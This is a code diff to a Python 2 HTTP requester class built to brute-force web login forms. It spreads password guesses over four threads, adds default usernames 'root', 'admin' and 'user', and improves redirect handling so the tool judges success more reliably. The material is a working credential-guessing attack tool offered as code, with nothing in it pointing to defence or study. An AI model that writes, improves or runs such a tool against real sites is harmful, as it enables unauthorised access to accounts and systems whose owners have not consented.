@@ -8,10 +8,13 @@ from bs4 import BeautifulSoup
 from postInfo import postInfo
 from ssl import wrap_socket
 
+standard_users= ['root', 'admin', 'user']
 attempts = []
 success = False
 login_cred = ""
 class Requester:
+    initial_host = ""
+    scheme = ""
     attempt_values = []
     pattern = re.compile("([4-5]..)")
     host = ""
@@ -24,26 +27,23 @@ class Requester:
                     "Accept-Language: en-US\r\n"
                     "Connection: Keep-Alive\r\n")
     def __init__(self, domain):
+        self.initial_host = domain
         parsed_domain = urlparse(domain)
         self.host = parsed_domain.netloc
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.sock.settimeout(1)
+        self.scheme = parsed_domain.scheme
         # Handle if connection not made
-        if parsed_domain.scheme.lower() == "https":
+        if self.scheme.lower() == "https":
             self.sock = wrap_socket(self.sock)
             self.sock.connect((self.host, 443))
         else:
             self.sock.connect((self.host, 80))
-        if self.sock == -1:
-            print -1
-        else:
-            print "Successful Connection"
-
     def __del__(self):
         self.sock.close()
 
     def get(self, url, cookies=None):
-        print "GET CALLED" + url
+        #print "GET CALLED" + url
         # path =  url[url.find('/')+1:]
         # path = path[path.find('/')+1:]
         # path = path[path.find('/'):]
@@ -59,6 +59,7 @@ class Requester:
                 cookie_string += " "
             header += "Cookie: {}".format(cookie_string[:-2])+"\r\n"
         header += "\r\n"
+        print header
         self.sock.send(header)
         response_header = ""
         response = ""
@@ -80,7 +81,7 @@ class Requester:
             #else if field[0] == 'Transfer-Encoding':
             #    if field[1] == 'chunked':
         #Parse Cookies
-        print response_header
+        #print response_header
         cookies = {}
         for field in response_header.split('\n'):
             if "Set-Cookie:" in  field:
@@ -92,9 +93,10 @@ class Requester:
         response = initial_response[initial_response.find('<html'):]
         #Handle Error Codes
         if(self.pattern.match(status_code)):
+            print response
             return -1
         self.sock.send(header)
-        print header
+        #print header
         current_amount = len(response)
         #while current_amount < total:
         try:
@@ -121,9 +123,9 @@ class Requester:
     def post(self, info, fields):
         #iterating through fields and adding to body of post
         #field dictionary in post
-        print info.url
+        #print info.url
         path = urlparse(info.url).path
-        print "PATH " + str(path)
+        #print "PATH " + str(path)
         # Build request body
         body = ""
         for key in fields.keys():
@@ -146,7 +148,7 @@ class Requester:
             header += "Cookie: {}".format(cookie_string[:-2])+"\r\n"
         header += "\r\n"
         header += body + "\r\n\r\n"
-        # print header
+        #print header
         response = ""
         try:
             self.sock.send(header)
@@ -159,28 +161,30 @@ class Requester:
             if response.find("<html>") != -1:
                 response = response[:response.find('</html>')+7]
             #print response
-        redirect = handle_redirect(response, info.cookies)
+        redirect = self.handle_redirect(response, info.cookies)
         if redirect:
             response = redirect
 
         return response
 
-    def ATTACK(self, low, high, info, query, passwords, password_field):
+    def ATTACK(self, low, high, info, form_inputs, passwords, password_field):
         global attempts
         global success
         global login_cred
         global list_lock
         for i in range(low,high):
-            print success
+            #print success
             if success:
                 return None
+            query = form_inputs.copy()
             query[password_field] = passwords[i]
-            print query
-            attempts.append(query.copy())
-            r = Requester(self.host)
+            attempts.append(passwords[i])
+            r = Requester(self.initial_host)
             response = r.post(info, query)
-            print response
+            #print response
             redirect = self.handle_redirect(response)
+            print "TRYING" + str(passwords[i])
+            #print "REDIRECT? " + str(redirect)
             #print response.response_body
             #If response is redirect (3**) then call get on the url at location: xxxx
             #Else its probably js and just check the page returned for password
@@ -188,6 +192,7 @@ class Requester:
                 soup = BeautifulSoup(redirect.response_body, "html.parser")
             else:
                 soup = BeautifulSoup(response, "html.parser")
+
             if soup.findAll(type ="password"):
                 #False if Login successful(supposedly)
                 continue
@@ -196,14 +201,28 @@ class Requester:
                 success = True
         return None
 
+    def bruteForceInit(self, url, user_list, keywords, action, login_field, password_field, login_form):
+        global standard_users
+        global login_cred
+        credential_list = []
+        if not user_list:
+            print " Added Standard Users "
+            user_list = user_list + standard_users
+            print user_list
+        for user in user_list:
+            self.bruteForce(url, user, keywords, action, login_field, password_field, login_form)
+            if login_cred:
+                break
+        return login_cred
 #Returns Dictionary of correct credentials if successful bruteforce.
 #Unsuccessful Bruteforces return null
-    def bruteForce(self, url, username, keywords, action, login_field, password_field):
+    def bruteForce(self, url, username, keywords, action, login_field, password_field, login_form):
         #r = Requester(url)
         global attempts
-        print "URL "+str(url)
+        global login_cred
+        #print "URL "+str(url)
         info  = self.get(url)
-        print info.url
+        #print info.url
         #Assume action doesnt have a slash
         if action[0] == '/':
             action = action[1:]
@@ -211,32 +230,42 @@ class Requester:
         #Attempt to login
         query = {}
         #Only works for one username
-        query[login_field] = username
+        login_form[login_field] = username
         threads = []
         for i in range(4):
             low = (len(keywords)/4)*i
             high = (len(keywords)/4)*(i+1)
-            threads.append(Thread(target=self.ATTACK, args=(low, high, info, {login_field:username}, keywords, password_field)))
+            threads.append(Thread(target=self.ATTACK, args=(low, high, info, login_form, keywords, password_field)))
             threads[i].start()
         for t in threads:
             t.join()
-        self.attempt_values = attempts
-        print attempts
+        self.attempt_values =  self.attempt_values + attempts
         return login_cred
 
     def handle_redirect(self, response, cookies= None):
         status = re.compile('3\d{2}')
         response_code = response.splitlines()[0]
+        #print response_code
         redirect = status.search(response_code)
+        #print redirect
+        #print response
         if redirect:
             new_host_index = response.find("Location: ") + len("Location: ")
             new_host_end = response[new_host_index:].find('\n') + new_host_index
             new_host = response[new_host_index:new_host_end]
-            new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            new_sock.settimeout(1)
             if self.host == urlparse(new_host).netloc:
                 new_response = self.get(new_host, cookies)
                 return new_response.response_body
+            elif not urlparse(new_host).netloc: # only has relativepath
+                if new_host.startswith('/'):
+                    new_host = self.scheme + '://' +  self.host + new_host
+                else:
+                    new_host = self.scheme + '://' + self.host + '/' + new_host
+                new_host= ''.join(new_host.split())
+                print new_host
+                new_response = self.get(new_host, cookies)
+                return new_response.response_body
+
         return False
 
 
